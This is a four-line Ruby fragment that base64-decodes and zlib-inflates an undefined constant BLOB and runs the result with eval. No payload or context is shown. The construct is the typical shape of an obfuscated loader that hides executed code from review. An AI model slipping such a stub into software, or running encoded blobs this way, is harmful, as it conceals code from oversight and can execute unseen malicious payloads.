require "base64"
require "zlib"
code = Zlib::Inflate.inflate(Base64.decode64(BLOB))
eval(code)
